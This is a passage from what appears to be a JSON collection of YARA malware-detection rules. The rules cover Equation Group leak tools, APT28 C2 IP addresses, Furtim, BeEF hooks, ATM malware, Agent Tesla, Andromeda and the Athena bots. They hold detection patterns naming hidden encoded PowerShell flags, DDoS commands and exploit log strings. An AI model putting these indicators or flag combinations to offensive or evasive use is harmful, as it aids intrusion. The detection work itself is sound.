\"Connection closed by remote host (TCP Ack/Fin)\" fullword ascii\n      $s4 = \"ServerErrorBadNamePassword\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 2000KB and all of ($s*) or 1 of ($x*) )\n}",
  "EquationGroup_Toolset_Apr17__SendCFTrigger_SendPKTrigger_6": "rule EquationGroup_Toolset_Apr17__SendCFTrigger_SendPKTrigger_6 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      super_rule = 1\n      hash1 = \"3bee31b9edca8aa010a4684c2806b0ca988b2bcc14ad0964fec4f11f3f6fb748\"\n      hash2 = \"2f9c7a857948795873a61f4d4f08e1bd0a41e3d6ffde212db389365488fa6e26\"\n   strings:\n      $s4 = \"* Failed to connect to destination - %u\" fullword wide\n      $s6 = \"* Failed to convert destination address into sockaddr_storage values\" fullword wide\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 400KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17__AddResource": "rule EquationGroup_Toolset_Apr17__AddResource {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      super_rule = 1\n      hash1 = \"e83e4648875d4c4aa8bc6f3c150c12bad45d066e2116087cdf78a4a4efbab6f0\"\n      hash2 = \"5a04d65a61ef04f5a1cbc29398c767eada367459dc09c54c3f4e35015c71ccff\"\n   strings:\n      $s1 = \"%s cm 10 2000 \\\"c:\\\\MY DIR\\\\myapp.exe\\\" c:\\\\MyResourceData.dat\" fullword ascii\n      $s2 = \"<PE path> - the path to the PE binary to which to add the resource.\" fullword ascii\n      $s3 = \"Unable to get path for target binary.\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 300KB and 2 of them )\n}",
  "EquationGroup_Toolset_Apr17__ESKE_RPC2_8": "rule EquationGroup_Toolset_Apr17__ESKE_RPC2_8 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      super_rule = 1\n      hash1 = \"9d16d97a6c964e0658b6cd494b0bbf70674bf37578e2ff32c4779a7936e40556\"\n      hash2 = \"5c0896dbafc5d8cc19b1bc7924420b20ed5999ac5bee2cb5a91aada0ea01e337\"\n   strings:\n      $s4 = \"Fragment: Packet too small to contain RPC header\" fullword ascii\n      $s5 = \"Fragment pickup: SmbNtReadX failed\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 700KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17__LSADUMP_Lp_ModifyPrivilege_Lp_PacketScan_Lp_put_Lp_RemoteExecute_Lp_Windows_Lp_wmi_Lp_9": "rule EquationGroup_Toolset_Apr17__LSADUMP_Lp_ModifyPrivilege_Lp_PacketScan_Lp_put_Lp_RemoteExecute_Lp_Windows_Lp_wmi_Lp_9 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      super_rule = 1\n      hash1 = \"c7bf4c012293e7de56d86f4f5b4eeb6c1c5263568cc4d9863a286a86b5daf194\"\n      hash2 = \"d92928a867a685274b0a74ec55c0b83690fca989699310179e184e2787d47f48\"\n      hash3 = \"2d963529e6db733c5b74db1894d75493507e6e40da0de2f33e301959b50f3d32\"\n      hash4 = \"e9f6a84899c9a042edbbff391ca076169da1a6f6dfb61b927942fe4be3327749\"\n      hash5 = \"d989d610b032c72252a2df284d0b53f63f382e305de2a18b453a0510ab6246a3\"\n      hash6 = \"23d98bca1f6e2f6989d53c2f2adff996ede2c961ea189744f8ae65621003b8b1\"\n      hash7 = \"d7ae24816fda190feda6a60639cf3716ea00fb63a4bd1069b8ce52d10ad8bc7f\"\n   strings:\n      $x1 = \"Injection Lib -  \" wide\n      $x2 = \"LSADUMP - - ERROR\" wide\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 300KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17__ETBL_ETRE_10": "rule EquationGroup_Toolset_Apr17__ETBL_ETRE_10 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      super_rule = 1\n      hash1 = \"70db3ac2c1a10de6ce6b3e7a7890c37bffde006ea6d441f5de6d8329add4d2ef\"\n      hash2 = \"e0f05f26293e3231e4e32916ad8a6ee944af842410c194fce8a0d8ad2f5c54b2\"\n   strings:\n      $x1 = \"Probe #2 usage: %s -i TargetIp -p TargetPort -r %d [-o TimeOut] -t Protocol -n IMailUserName -a IMailPassword\" fullword ascii\n      $x6 = \"** RunExploit ** - EXCEPTION_EXECUTE_HANDLER : 0x%08X\" fullword ascii\n      $s19 = \"Sending Implant Payload.. cEncImplantPayload size(%d)\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 200KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17__ELV_ESKE_ETBL_ETRE_EVFR_11": "rule EquationGroup_Toolset_Apr17__ELV_ESKE_ETBL_ETRE_EVFR_11 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      super_rule = 1\n      hash1 = \"f7fad44560bc8cc04f03f1d30b6e1b4c5f049b9a8a45464f43359cbe4d1ce86f\"\n      hash2 = \"9d16d97a6c964e0658b6cd494b0bbf70674bf37578e2ff32c4779a7936e40556\"\n      hash3 = \"70db3ac2c1a10de6ce6b3e7a7890c37bffde006ea6d441f5de6d8329add4d2ef\"\n      hash4 = \"e0f05f26293e3231e4e32916ad8a6ee944af842410c194fce8a0d8ad2f5c54b2\"\n      hash5 = \"c5e119ff7b47333f415aea1d2a43cb6cb322f8518562cfb9b90399cac95ac674\"\n   strings:\n      $x1 = \"Target is vulnerable\" fullword ascii\n      $x2 = \"Target is NOT vulnerable\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 2000KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17__ELV_ESKE_EVFR_RideArea2_12": "rule EquationGroup_Toolset_Apr17__ELV_ESKE_EVFR_RideArea2_12 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      super_rule = 1\n      hash1 = \"f7fad44560bc8cc04f03f1d30b6e1b4c5f049b9a8a45464f43359cbe4d1ce86f\"\n      hash2 = \"9d16d97a6c964e0658b6cd494b0bbf70674bf37578e2ff32c4779a7936e40556\"\n      hash3 = \"c5e119ff7b47333f415aea1d2a43cb6cb322f8518562cfb9b90399cac95ac674\"\n      hash4 = \"e702223ab42c54fff96f198611d0b2e8a1ceba40586d466ba9aadfa2fd34386e\"\n   strings:\n      $x2 = \"** CreatePayload ** - EXCEPTION_EXECUTE_HANDLER\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 2000KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17__ELV_ESKE_13": "rule EquationGroup_Toolset_Apr17__ELV_ESKE_13 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      super_rule = 1\n      hash1 = \"f7fad44560bc8cc04f03f1d30b6e1b4c5f049b9a8a45464f43359cbe4d1ce86f\"\n      hash2 = \"9d16d97a6c964e0658b6cd494b0bbf70674bf37578e2ff32c4779a7936e40556\"\n   strings:\n      $x1 = \"Skip call to PackageRideArea().  Payload has already been packaged. Options -x and -q ignored.\" fullword ascii\n      $s2 = \"ERROR: pGvars->pIntRideAreaImplantPayload is NULL\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 600KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17__NameProbe_SMBTOUCH_14": "rule EquationGroup_Toolset_Apr17__NameProbe_SMBTOUCH_14 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      super_rule = 1\n      hash1 = \"fbe3a4501654438f502a93f51b298ff3abf4e4cad34ce4ec0fad5cb5c2071597\"\n      hash2 = \"7da350c964ea43c149a12ac3d2ce4675cedc079ddc10d1f7c464b16688305309\"\n   strings:\n      $s1 = \"DEC Pathworks TCPIP service on Windows NT\" fullword ascii\n      $s2 = \"<\\\\\\\\__MSBROWSE__> G\" fullword ascii\n      $s3 = \"<IRISNAMESERVER>\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 300KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17__ELV_ESKE_EVFR_RPC2_15": "rule EquationGroup_Toolset_Apr17__ELV_ESKE_EVFR_RPC2_15 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      super_rule = 1\n      hash1 = \"f7fad44560bc8cc04f03f1d30b6e1b4c5f049b9a8a45464f43359cbe4d1ce86f\"\n      hash2 = \"9d16d97a6c964e0658b6cd494b0bbf70674bf37578e2ff32c4779a7936e40556\"\n      hash3 = \"c5e119ff7b47333f415aea1d2a43cb6cb322f8518562cfb9b90399cac95ac674\"\n      hash4 = \"5c0896dbafc5d8cc19b1bc7924420b20ed5999ac5bee2cb5a91aada0ea01e337\"\n   strings:\n      $x1 = \"** SendAndReceive ** - EXCEPTION_EXECUTE_HANDLER\" fullword ascii\n      $s8 = \"Binding to RPC Interface %s over named pipe\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 2000KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17__ELV_ESKE_EVFR_16": "rule EquationGroup_Toolset_Apr17__ELV_ESKE_EVFR_16 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      super_rule = 1\n      hash1 = \"f7fad44560bc8cc04f03f1d30b6e1b4c5f049b9a8a45464f43359cbe4d1ce86f\"\n      hash2 = \"9d16d97a6c964e0658b6cd494b0bbf70674bf37578e2ff32c4779a7936e40556\"\n      hash3 = \"c5e119ff7b47333f415aea1d2a43cb6cb322f8518562cfb9b90399cac95ac674\"\n   strings:\n      $x1 = \"ERROR: TbMalloc() failed for encoded exploit payload\" fullword ascii\n      $x2 = \"** EncodeExploitPayload ** - EXCEPTION_EXECUTE_HANDLER\" fullword ascii\n      $x4 = \"** RunExploit ** - EXCEPTION_EXECUTE_HANDLER\" fullword ascii\n      $s6 = \"Sending Implant Payload (%d-bytes)\" fullword ascii\n      $s7 = \"ERROR: Encoder failed on exploit payload\" fullword ascii\n      $s11 = \"ERROR: VulnerableOS() != RET_SUCCESS\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 2000KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17__ETBL_ETRE_SMBTOUCH_17": "rule EquationGroup_Toolset_Apr17__ETBL_ETRE_SMBTOUCH_17 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      super_rule = 1\n      hash1 = \"70db3ac2c1a10de6ce6b3e7a7890c37bffde006ea6d441f5de6d8329add4d2ef\"\n      hash2 = \"e0f05f26293e3231e4e32916ad8a6ee944af842410c194fce8a0d8ad2f5c54b2\"\n      hash3 = \"7da350c964ea43c149a12ac3d2ce4675cedc079ddc10d1f7c464b16688305309\"\n   strings:\n      $x1 = \"ERROR: Connection terminated by Target (TCP Ack/Fin)\" fullword ascii\n      $s2 = \"Target did not respond within specified amount of time\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 300KB and 1 of them )\n}",
  "EquationGroup_scanner_output": "rule EquationGroup_scanner_output {\n   meta:\n      description = \"Detects output generated by EQGRP scanner.exe\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-04-17\"\n   strings:\n      $s1 = \"# Scan for windows boxes\" ascii fullword\n      $s2 = \"Going into send\" ascii fullword\n      $s3 = \"# Does not work\" ascii fullword\n      $s4 = \"You are the weakest link, goodbye\" ascii fullword\n      $s5 = \"rpc   Scan for RPC  folks\" ascii fullword\n   condition:\n      filesize < 1000KB and 2 of them\n}",
  "COZY_FANCY_BEAR_Hunt": "rule COZY_FANCY_BEAR_Hunt \n{\n\n    meta:\n        description = \"Detects Cozy Bear / Fancy Bear C2 Server IPs\"\n        author = \"Florian Roth\"\n        reference = \"https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/\"\n        date = \"2016-06-14\"\n\n    strings:\n        $s1 = \"185.100.84.134\" ascii wide fullword\n        $s2 = \"58.49.58.58\" ascii wide fullword\n        $s3 = \"218.1.98.203\" ascii wide fullword\n        $s4 = \"187.33.33.8\" ascii wide fullword\n        $s5 = \"185.86.148.227\" ascii wide fullword\n        $s6 = \"45.32.129.185\" ascii wide fullword\n        $s7 = \"23.227.196.217\" ascii wide fullword\n\n    condition:\n        uint16(0) == 0x5a4d and 1 of them\n}",
  "COZY_FANCY_BEAR_pagemgr_Hunt": "rule COZY_FANCY_BEAR_pagemgr_Hunt \n{\n\n    meta:\n        description = \"Detects a pagemgr.exe as mentioned in the CrowdStrike report\"\n        author = \"Florian Roth\"\n        reference = \"https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/\"\n        date = \"2016-06-14\"\n\n    strings:\n        $s1 = \"pagemgr.exe\" wide fullword\n\n    condition:\n        uint16(0) == 0x5a4d and 1 of them\n}",
  "APT_fancybear_Downdelph_magic": "rule APT_fancybear_Downdelph_magic : Bootkit{\n\tmeta:\n\t\tauthor = \"Marc Salinas @Bondey_m\"\n\t\tdescription = \"APT28 downdelph magic string\"\n\t\treference = \"https://www.threatminer.org/_reports/2016/eset-sednit-part3%20-%20ESET.pdf#viewer.action=download\"\n\tstrings:\n\t\t$str1 = \" :3 \"\n\tcondition:\n\t\t$str1 at 0\n}",
  "APT_fancybear_Downdelph_MBR": "rule APT_fancybear_Downdelph_MBR : Bootkit{\n\tmeta:\n\t\tauthor = \"Marc Salinas @Bondey_m\"\n\t\tdescription = \"APT28 downdelph string on MBR (get your MBR with BOOTICE on Win or #dd if=/dev/sda of=./sda.mbr bs=512 count=1\"\n\t\treference = \"https://www.threatminer.org/_reports/2016/eset-sednit-part3%20-%20ESET.pdf#viewer.action=download\"\n\tstrings:\n\t\t$s1 = { 20 3A 33 20 } //string \" :3 \"\n\tcondition:\n\t\t$s1 at 411  //posici\u00f3n 0x19b\n}",
  "Furtim_nativeDLL": "rule Furtim_nativeDLL \n{\n\n    meta:\n        description = \"Detects Furtim malware - file native.dll\"\n        author = \"Florian Roth\"\n        reference = \"MISP 3971\"\n        date = \"2016-06-13\"\n        hash1 = \"4f39d3e70ed1278d5fa83ed9f148ca92383ec662ac34635f7e56cc42eeaee948\"\n\n    strings:\n        $s1 = \"FqkVpTvBwTrhPFjfFF6ZQRK44hHl26\" fullword ascii\n        $op0 = { e0 b3 42 00 c7 84 24 ac } /* Opcode */\n        $op1 = { a1 e0 79 44 00 56 ff 90 10 01 00 00 a1 e0 79 44 } /* Opcode */\n        $op2 = { bf d0 25 44 00 57 89 4d f0 ff 90 d4 02 00 00 59 } /* Opcode */\n    condition:\n        uint16(0) == 0x5a4d and filesize < 900KB and $s1 or all of ($op*)\n}",
  "Furtim_Parent_1": "rule Furtim_Parent_1 \n{\n\n    meta:\n        description = \"Detects Furtim Parent Malware\"\n        author = \"Florian Roth\"\n        reference = \"https://sentinelone.com/blogs/sfg-furtims-parent/\"\n        date = \"2016-07-16\"\n        hash1 = \"766e49811c0bb7cce217e72e73a6aa866c15de0ba11d7dda3bd7e9ec33ed6963\"\n\n    strings:\n        /* RC4 encryption password */\n        $x1 = \"dqrChZonUF\" fullword ascii\n        /* Other strings */\n        $s1 = \"Egistec\" fullword wide\n        $s2 = \"Copyright (C) 2016\" fullword wide\n        /* Op Code */\n        $op1 = { c0 ea 02 88 55 f8 8a d1 80 e2 03 }\n        $op2 = { 5d fe 88 55 f9 8a d0 80 e2 0f c0 }\n        $op3 = { c4 0c 8a d9 c0 eb 02 80 e1 03 88 5d f8 8a d8 c0 }\n  \n    condition:\n        ( uint16(0) == 0x5a4d and filesize < 900KB and ( $x1 or ( all of ($s*) and all of ($op*) ) ) ) or all of them\n}",
  "BeEF_browser_hooked": "rule BeEF_browser_hooked \n{\n\tmeta:\n\t\tdescription = \"Yara rule related to hook.js, BeEF Browser hooking capability\"\n\t\tauthor = \"Pasquale Stirparo\"\n\t\tdate = \"2015-10-07\"\n\t\thash1 = \"587e611f49baf63097ad2421ad0299b7b8403169ec22456fb6286abf051228db\"\n\t\n\tstrings:\n\t\t$s0 = \"mitb.poisonAnchor\" wide ascii\n\t\t$s1 = \"this.request(this.httpproto\" wide ascii\n\t\t$s2 = \"beef.logger.get_dom_identifier\" wide ascii\n\t\t$s3 = \"return (!!window.opera\" wide ascii \n\t\t$s4 = \"history.pushState({ Be:\\\"EF\\\" }\" wide ascii \n\t\t$s5 = \"window.navigator.userAgent.match(/Opera\\\\/9\\\\.80.*Version\\\\/10\\\\./)\" wide ascii \n\t\t$s6 = \"window.navigator.userAgent.match(/Opera\\\\/9\\\\.80.*Version\\\\/11\\\\./)\" wide ascii \n\t\t$s7 = \"window.navigator.userAgent.match(/Avant TriCore/)\" wide ascii \n\t\t$s8 = \"window.navigator.userAgent.match(/Iceweasel\" wide ascii \n\t\t$s9 = \"mitb.sniff(\" wide ascii \n\t\t$s10 = \"Method XMLHttpRequest.open override\" wide ascii \n\t\t$s11 = \".browser.hasWebSocket\" wide ascii \n\t\t$s12 = \".mitb.poisonForm\" wide ascii \n\t\t$s13 = \"resolved=require.resolve(file,cwd||\" wide ascii \n\t\t$s14 = \"if (document.domain == domain.replace(/(\\\\r\\\\n|\\\\n|\\\\r)/gm\" wide ascii \n\t\t$s15 = \"beef.net.request\" wide ascii \n\t\t$s16 = \"uagent.search(engineOpera)\" wide ascii \n\t\t$s17 = \"mitb.sniff\" wide ascii\n\t\t$s18 = \"beef.logger.start\" wide ascii\n\t\n\tcondition:\n\t\tall of them\n}",
  "GEN_PowerShell": "rule GEN_PowerShell \n{\n\n    meta:\n        description = \"Generic PowerShell Malware Rule\"\n        author = \"https://github.com/interleaved\"\n    \n    strings:\n        $s1 = \"powershell\"\n        $s2 = \"-ep bypass\" nocase\n        $s3 = \"-nop\" nocase\n        $s10 = \"-executionpolicy bypass\" nocase\n        $s4 = \"-win hidden\" nocase\n        $s5 = \"-windowstyle hidden\" nocase\n        $s11 = \"-w hidden\" nocase\n        /*$s6 = \"-noni\" fullword ascii*/\n        /*$s7 = \"-noninteractive\" fullword ascii*/\n        $s8 = \"-enc\" nocase\n        $s9 = \"-encodedcommand\" nocase\n    \n    condition:\n        $s1 and (($s2 or $s3 or $s10) and ($s4 or $s5 or $s11) and ($s8 or $s9))\n}",
  "Generic_ATMPot": "rule Generic_ATMPot : Generic_ATMPot\n{\n    meta:\n        description = \"Generic rule for Winpot aka ATMPot\"\n        author = \"xylitol@temari.fr\"\n        date = \"2019-02-24\"\n        reference = \"https://securelist.com/atm-robber-winpot/89611/\"\n        // May only the challenge guide you\n    strings:\n        $api1 = \"CSCCNG\" ascii wide\n        $api2 = \"CscCngOpen\" ascii wide\n        $api3 = \"CscCngClose\" ascii wide\n        $string1 = \"%d,%02d;\" ascii wide\n/*\n0xD:\n.text:004022EC FF 15 20 70 40 00             CALL DWORD PTR DS:[407020]  ; cscwcng.CscCngDispense\n.text:004022F2 F6 C4 80                      TEST AH,80\nwinpot:\n.text:004019D4 FF 15 24 60 40 00             CALL DWORD PTR DS:[406024]  ; cscwcng.CscCngDispense\n.text:004019DA F6 C4 80                      TEST AH,80\n*/\n        $hex1 = { FF 15 ?? ?? ?? ?? F6 C4 80 }\n/*\n0xD...: 0040506E  25 31 5B 31 2D 34 5D 56 41 4C 3D 25 38 5B 30 2D 39 5D: %1[1-4]VAL=%8[0-9]\nwinpot: 0040404D  25 31 5B 30 2D 39 5D 56 41 4C 3D 25 38 5B 30 2D 39 5D: %1[0-9]VAL=%8[0-9]\n*/\n        $hex2 = { 25 31 5B ?? 2D ?? 5D 56 41 4C 3D 25 38 5B 30 2D 39 5D }\n    condition:  \n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "ATM_HelloWorld": "rule ATM_HelloWorld : malware\n{\n    meta:\n        description = \"Search strings and procedure in HelloWorld ATM Malware\"\n        author = \"xylitol@temari.fr\"\n        date = \"2019-01-13\"\n\n    strings:\n        $api1 = \"CscCngOpen\" ascii wide\n        $api2 = \"CscCngClose\" ascii wide\n        $string1 = \"%d,%02d;\" ascii wide\n        $string2 = \"MAX_NOTES\" ascii wide\n        $hex_var1 = { FF 15 ?? ?? ?? ?? BF 00 80 00 00 85 C7 }\n\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "Agenttesla": "rule Agenttesla\n{\n    meta:\n        description = \"Detecting HTML strings used by Agent Tesla malware\"\n        author = \"Stormshield\"\n        reference = \"https://thisissecurity.stormshield.com/2018/01/12/agent-tesla-campaign/\"\n        version = \"1.0\"\n\n    strings:\n        $html_username    = \"<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: \" wide ascii\n        $html_pc_name     = \"<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: \" wide ascii\n        $html_os_name     = \"<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: \" wide ascii\n        $html_os_platform = \"<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: \" wide ascii\n        $html_clipboard   = \"<br><span style=font-style:normal;text-decoration:none;text-transform:none;color:#FF0000;><strong>[clipboard]</strong></span>\" wide ascii\n\n    condition:\n        3 of them\n}",
  "agenttesla_smtp_variant": "",
  "almashreq_agent_dotnet": "rule almashreq_agent_dotnet : almashreq_agent_dotnet\n{\n    meta:\n        description = \"Memory rule for a .net RAT/Agent first found with .pdb referencing almashreq\"\n\tauthor = \"J from THL <j@techhelplist.com> with thx to @malwrhunterteam !!1!\"\n        date = \"2019-05-12\"\n        reference1 = \"https://twitter.com/JayTHL/status/1127334608142503936\"\n        reference2 = \"https://www.virustotal.com/#/file/f6e1e425650abc6c0465758edf3c089a1dde5b9f58d26a50d3b8682cc38f12c8/details\"\n        reference3 = \"https://www.virustotal.com/#/file/7e4231dc2bdab53f494b84bc13c6cb99478a6405405004c649478323ed5a9071/detection\"\n        reference4 = \"https://www.virustotal.com/#/file/3cbaf6ddba3869ab68baf458afb25d2c8ba623153c43708bad2f312c4663161b/detection\"\n        reference5 = \"https://www.virustotal.com/#/file/0f5424614b3519a340198dd82ad0abc9711a23c3283dc25b519affe5d2959a92/detection\" \n        maltype = \"agent\"\n\tfiletype = \"memory\"\n\n    strings:\n        $s01 = \"WriteElementString(@\\\"PCName\\\",\" wide\n        $s02 = \"WriteElementString(@\\\"Command\\\",\" wide\n        $s03 = \"WriteElementStringRaw(@\\\"commandID\\\",\" wide\n\t$s04 = /^Try Run$/ wide\n        $s05 = \" is running in PC :\" wide\n        $s06 = \"SOAPAction: \\\"http://tempuri.org/Set\\\"\" wide\n        $s07 = \"Try Run</obj><name>\" wide\n        $s08 = \"Disable</obj><name>\" wide\n        $s09 = \"http://tempuri.org/\" wide\n\n \tcondition: \n \t\t7 of them\n}",
  "alina": "rule alina\n{\n\tmeta:\n\t\tauthor = \"Brian Wallace @botnet_hunter\"\n\t\tauthor_email = \"bwall@ballastsecurity.net\"\n\t\tdate = \"2014-08-09\"\n\t\tdescription = \"Identify Alina\"\n\tstrings:\n\t\t$s1 = \"Alina v1.0\"\n\t\t$s2 = \"POST\"\n\t\t$s3 = \"1[0-2])[0-9]\"\n\n\tcondition:\n        \tall of them\n}",
  "andromeda": "rule andromeda\n{\n    \n    meta:\n        author = \"Brian Wallace @botnet_hunter\"\n        author_email = \"bwall@ballastsecurity.net\"\n        date = \"2014-03-13\"\n        description = \"Identify Andromeda\"\n    \n    strings:\n        $config = {1c 1c 1d 03 49 47 46}\n        $c1 = \"hsk\\\\ehs\\\\dihviceh\\\\serhlsethntrohntcohurrehem\\\\chsyst\"\n    \n    condition:\n        all of them\n}",
  "Worm_Gamarue": "rule Worm_Gamarue \n{\n\n    meta:\n        author = \"Centro Criptol\u00f3gico Nacional (CCN)\"\n        ref = \"https://www.ccn-cert.cni.es/informes/informes-ccn-cert-publicos.html\"\n        description = \"Gamarue_Andromeda\"       \n\n    strings:\n        $a = { 69 E1 2A B0 2D 80 44 E3 2D 80 44 E3 2D 80 44 E3 EE 8F 1B E3 2A 80 44 E3 EE 8F 19 E3 3A 80 44 E3 2D 80 45 E3 CD 81 44 E3 0A 46 39 E3 34 80 44 E3 0A 46 29 E3 A5 80 44 E3 0A 46 2A E3 5C 80 44 E3 0A 46 36 E3 2C 80 44 E3 0A 46 3C E3 2C 80 44 E3 }\n    condition:\n        $a \n}",
  "andromeda_bot": "rule andromeda_bot\n{ \n    meta:\n        maltype = \"Andromeda bot\"\n        author = \"https://github.com/reed1713\"\n        description = \"IOC looks for the creation or termination of a process associated with the Andromeda Trojan. The malware will execute the msiexec.exe within the suspicious directory. Shortly after, it creates and injects itself into the wuauctl.exe (windows update) process. It then attempts to beacon to its C2.\"\n   \n    strings:\n        $type=\"Microsoft-Windows-Security-Auditing\"\n        $eventid=\"4688\"\n        $data=\"AppData\\\\Local\\\\Temp\\\\_.net_\\\\msiexec.exe\"\n\n    condition:\n        all of them\n}",
  "Arkei": "rule Arkei : Arkei \n{\n    meta:\n        Author = \"Fumik0_\" \n        Description = \"Arkei Stealer\"\n        Date = \"2018/07/10\"\n        Hash = \"5632c89fe4c7c2c87b69d787bbf0a5b4cc535f1aa02699792888c60e0ef88fc5\"\n\n    strings:\n        $s1 = \"Arkei\" wide ascii\n        $s2 = \"/server/gate\" wide ascii\n        $s3 = \"/server/grubConfig\" wide ascii\n        $s4 = \"\\\\files\\\\\" wide ascii\n        $s5 = \"SQLite\" wide ascii\n\n    condition:\n        all of ($s*)\t\n}",
  "AthenaHTTP": "rule AthenaHTTP\n{\n    \n    meta:\n        author = \"Brian Wallace @botnet_hunter\"\n        author_email = \"bwall@ballastsecurity.net\"\n        date = \"2014-08-09\"\n        description = \"Identify Athena HTTP\"\n    \n    strings:\n        $s1 = \"%s(%s)\"\n        $s2 = \"type:on_exec\"\n        $s3 = \"uid:%s\"\n        $s4 = \"priv:%s\"\n        $s5 = \"arch:x%s\"\n        $s6 = \"gend:%s\"\n        $s7 = \"cores:%i\"\n        $s8 = \"ver:%s\"\n        $s9 = \"net:%s\"\n    \n    condition:\n        all of them\n}",
  "AthenaHTTP_v2": "rule AthenaHTTP_v2 \n{\n    \n    meta:\n        author = \"Jason Jones <jasonjones@arbor.net>\"\n        description = \"Athena HTTP identification\"\n        source = \"https://github.com/arbor/yara/blob/master/athena.yara\"\n\n    strings:\n        $fmt_str1=\"|type:on_exec|uid:%s|priv:%s|arch:x%s|gend:%s|cores:%i|os:%s|ver:%s|net:%s|\"\n        $fmt_str2=\"|type:repeat|uid:%s|ram:%ld|bk_killed:%i|bk_files:%i|bk_keys:%i|busy:%s|\"\n        $cmd1 = \"filesearch.stop\"\n        $cmd2 = \"rapidget\"\n        $cmd3 = \"layer4.\"\n        $cmd4 = \"slowloris\"\n        $cmd5 = \"rudy\"\n   \n    condition:\n        all of ($fmt_str*) and 3 of ($cmd*)\n}",
  "AthenaIRC": "rule AthenaIRC \n{\n\n    meta:\n        author = \"Jason Jones <jasonjones@arbor.net>\"\n        description = \"Athena IRC v1.8.x, 2.x identification\"\n        source = \"https://github.com/arbor/yara/blob/master/athena.yara\"\n\n    strings:\n        $cmd1 = \"ddos.\" fullword\n        $cmd2 = \"layer4.\" fullword\n        $cmd3 = \"war.\" fullword\n        $cmd4 = \"smartview\" fullword\n        $cmd5 = \"ftp.upload\" fullword\n        $msg1 = \"%s %s :%s LAYER4 Combo Flood: Stopped\"\n        $msg2 = \"%s %s :%s IRC War: Flood started [Type: %s | Target: %s]\"\n        $msg3 = \"%s %s :%s FTP Upload: Failed\"\n        $msg4 = \"Athena v2\"\n        $msg5 = \"%s %s :%s ECF Flood: Stopped [Total Connections: %ld | Rate: %ld Connections/Second]\"\n        // v1 strs\n        $amsg1 = \"ARME flood on %s/%s:%i for %i seconds [Host confirmed vulnerable\"\n        $amsg2 = \" Rapid HTTP Combo flood on %s:%i for %i seconds\"\n        $amsg3 = \"Began flood: %i connections every %i ms to 